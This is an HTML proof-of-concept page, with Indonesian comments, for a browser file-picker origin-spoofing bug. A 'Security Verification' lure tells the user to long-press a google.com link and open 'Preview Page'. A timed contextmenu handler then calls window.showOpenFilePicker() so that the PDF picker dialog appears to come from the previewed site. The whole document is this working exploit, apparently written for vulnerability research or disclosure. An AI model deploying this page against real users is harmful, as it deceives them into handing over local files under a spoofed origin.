<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced PoC - File Picker Origin Spoofing</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #1e293b;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        }
        a.target-link {
            display: inline-block;
            background-color: #3b82f6;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            font-weight: bold;
            border-radius: 6px;
            margin-top: 15px;
            transition: background 0.2s;
        }
        a.target-link:active {
            background-color: #2563eb;
        }
        #log {
            margin-top: 20px;
            font-size: 0.85rem;
            color: #94a3b8;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Security Verification</h2>
        <a>Tekan dan tahan (Long Press) tautan di bawah ini, lalu pilih opsi <a>"Preview Page"</a>.</a>
        
        <!-- Target Link yang memicu konteks menu -->
        <a href="https://google.com" class="target-link" id="spoofTarget">Long Press -> Preview Page</a>
        
        <div id="log">Status: Menunggu interaksi...</div>
    </div>

    <script>
        const logElement = document.getElementById("log");

        // Memperkuat penangkapan event contextmenu dan interaksi sentuh
        document.addEventListener("contextmenu", (e) => {
            logElement.innerText = "Status: Context menu terdeteksi. Mengatur timer eksekusi...";
            
            // Penundaan waktu yang disesuaikan agar dialog muncul tepat saat panel preview aktif
            setTimeout(async () => {
                try {
                    logElement.innerText = "Status: Memanggil window.showOpenFilePicker()...";
                    
                    // Eksekusi API file picker di latar belakang saat preview sheet terbuka
                    const handle = await window.showOpenFilePicker({
                        types: [{
                            description: 'Dokumen Verifikasi',
                            accept: { 'application/pdf': ['.pdf'] }
                        }]
                    });
                    
                    logElement.innerText = "Status Sukses: Dialog file picker berhasil dipicu!";
                } catch (err) {
                    // Menangkap error jika dibatalkan pengguna atau diblokir oleh patch keamanan browser
                    logElement.innerText = `Status Diblokir/Gagal: ${err.name} - ${err.message}`;
                }
            }, 1400); // Waktu tunda optimal dalam milidetik (dapat disesuaikan)
        });

        // Tambahan pemantauan visibilitas halaman untuk melacak status transisi tab/preview
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                console.log("[PoC] Halaman utama tertutup/berada di latar belakang karena preview aktif.");
            } else {
                console.log("[PoC] Pengguna kembali ke halaman utama.");
            }
        });
    </script>

</body>
</html>
